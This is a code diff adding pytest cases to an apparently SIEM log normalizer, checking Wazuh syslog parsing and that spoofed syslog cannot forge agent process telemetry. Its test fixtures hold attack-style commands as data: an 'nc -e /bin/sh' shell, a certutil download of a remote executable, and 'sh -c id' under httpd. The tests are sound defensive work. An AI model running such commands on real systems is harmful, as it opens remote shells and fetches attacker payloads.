@@ -4,6 +4,7 @@ Chạy: cd server && python -m pytest -q
 from __future__ import annotations
 
 import json
+import re
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
@@ -102,6 +103,110 @@ def test_suricata_eve():
            "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
     d = normalize(raw("suricata", {"message": json.dumps(eve)}))
     assert get(d, "event.category") == "intrusion_detection" and get(d, "suricata.severity") == 1
+
+
+# Event Wazuh dựng đúng như archives.json (4.14.8) khi wazuh-manager nhận syslog 514: agent 000, location = IP gửi, full_log đã bỏ <PRI>
+PF_BLOCK = "5,,,1000000103,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.50,192.168.1.10,51000,22,0,S,1,,64240,,mss"
+SSH_FAIL = "Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2"
+
+
+def wazuh_event(agent_id, name, location, full_log):
+    return raw("wazuh", {"timestamp": "2026-11-01T07:47:09.929+0000", "agent": {"id": agent_id, "name": name},
+                         "manager": {"name": "wazuh-manager"}, "id": "1793519229.479", "full_log": full_log,
+                         "decoder": {}, "location": location}, source="wazuh", agent="wazuh")
+
+
+def wazuh_syslog(ip, line):
+    return wazuh_event("000", "wazuh-manager", ip, re.sub(r"^<\d+>", "", line))
+
+
+def wazuh_agent_event(agent_id, location, line):
+    return wazuh_event(agent_id, "web01", location, line)
+
+
+def test_wazuh_syslog_keeps_source_identity():
+    d = normalize(wazuh_syslog("10.10.40.254", "<134>Nov  1 10:00:00 fw01 filterlog[1]: " + PF_BLOCK))
+    assert get(d, "agent.id") == "syslog-10.10.40.254" and get(d, "observer.ip") == "10.10.40.254"
+    assert get(d, "host.name") == "fw01" and get(d, "event.module") == "pfsense"
+    assert get(d, "source.ip") == "203.0.113.50" and get(d, "destination.port") == 22
+
+
+def test_wazuh_syslog_without_header_host_falls_back_to_ip():
+    d = normalize(wazuh_syslog("10.10.40.254", "filterlog[1]: " + PF_BLOCK))
+    assert get(d, "host.name") == "10.10.40.254"
+
+
+def test_wazuh_syslog_ssh_and_ipv6_sender():
+    d = normalize(wazuh_syslog("fd00::1", "<38>Nov  1 10:00:01 web01 sshd[811]: " + SSH_FAIL))
+    assert get(d, "agent.id") == "syslog-fd00::1" and get(d, "event.module") == "auth"
+    assert get(d, "source.ip") == "203.0.113.9" and get(d, "event.outcome") == "failure"
+
+
+def test_wazuh_syslog_long_suricata_eve():
+    eve = {"timestamp": "2026-11-01T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
+           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP", "http": {"url": "/" + "x" * 2500},
+           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
+    line = "<134>Nov  1 10:00:02 sur01 suricata[9]: " + json.dumps(eve)
+    assert len(line) > 2048
+    d = normalize(wazuh_syslog("10.10.40.254", line))
+    assert get(d, "event.module") == "suricata" and get(d, "suricata.signature") == "ET WEB_SERVER SQL Injection"
+    assert get(d, "agent.id") == "syslog-10.10.40.254"
+
+
+def test_wazuh_syslog_rfc5424_filterlog():
+    # remoted chỉ bỏ <PRI>: full_log bắt đầu bằng "1 <thời gian ISO> ..." (phiên bản RFC5424)
+    d = normalize(wazuh_syslog("10.10.40.254", "<134>1 2026-11-01T10:00:00+00:00 fw01 filterlog 4321 - - " + PF_BLOCK))
+    assert get(d, "host.name") == "fw01" and get(d, "event.module") == "pfsense"
+    assert get(d, "source.ip") == "203.0.113.50" and get(d, "destination.port") == 22
+
+
+def test_wazuh_syslog_rfc5424_suricata():
+    eve = {"timestamp": "2026-11-01T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
+           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP",
+           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
+    d = normalize(wazuh_syslog("10.10.40.254", "<134>1 2026-11-01T10:00:02+00:00 sur01 suricata 9 - - " + json.dumps(eve)))
+    assert get(d, "host.name") == "sur01" and get(d, "event.module") == "suricata"
+    assert get(d, "suricata.signature") == "ET WEB_SERVER SQL Injection"
+
+
+FORGED_AUDIT = {"audit": {"type": "EXECVE", "exe": "/usr/bin/nc", "command": "nc",
+                          "execve": {"a0": "nc", "a1": "-e", "a2": "/bin/sh"}}}
+FORGED_WIN = {"win": {"system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
+                      "eventdata": {"image": "C:\\Windows\\System32\\certutil.exe",
+                                    "commandLine": "certutil -urlcache -f http://x/a.exe a.exe"}}}
+
+
+def _with_data(ev, data):
+    ev["data"]["data"] = data
+    return ev
+
+
+@pytest.mark.parametrize("data,line", [
+    (FORGED_AUDIT, 'type=EXECVE msg=audit(1.1:1): argc=3 a0="nc" a1="-e" a2="/bin/sh"'),
+    (FORGED_WIN, '{"win":{}}'),
+    (None, "siem-proc: pid=4242 ppid=1 uid=0 name=sh parent=httpd exe=/bin/sh cmd=sh -c id"),
+    (None, "siem-xdr: action=deadbeefcafe type=block_ip target=203.0.113.9 status=success"),
+])
+def test_syslog_cannot_forge_agent_telemetry(data, line):
+    # syslog qua UDP giả được IP nguồn: nội dung chỉ được qua bộ đọc syslog, không thành event tiến trình / kết quả lệnh
+    ev = wazuh_syslog("10.10.40.254", line)
+    d = normalize(_with_data(ev, data) if data else ev)
+    assert get(d, "agent.id") == "syslog-10.10.40.254"
+    assert get(d, "event.category") != "process" and get(d, "process.command_line") is None
+    assert get(d, "event.module") not in ("auditd", "sysmon", "windows", "siem-xdr")
+
+
+def test_agent_audit_event_still_parsed():
+    ev = _with_data(wazuh_agent_event("001", "/var/log/audit/audit.log", 'type=EXECVE argc=3 a0="nc"'), FORGED_AUDIT)
+    d = normalize(ev)
+    assert get(d, "event.category") == "process" and "nc" in get(d, "process.command_line")
+
+
+def test_agent_event_is_not_treated_as_syslog():
+    d = normalize(wazuh_agent_event("001", "/var/log/auth.log", "Nov  1 10:00:01 web01 sshd[811]: " + SSH_FAIL))
+    assert get(d, "agent.id") == "001" and get(d, "observer.ip") is None
+    d = normalize(wazuh_event("000", "wazuh-manager", "wazuh-monitord", "ossec: Manager started."))
+    assert get(d, "agent.id") == "000" and get(d, "observer.ip") is None
 
 
 def test_garbage_does_not_crash():
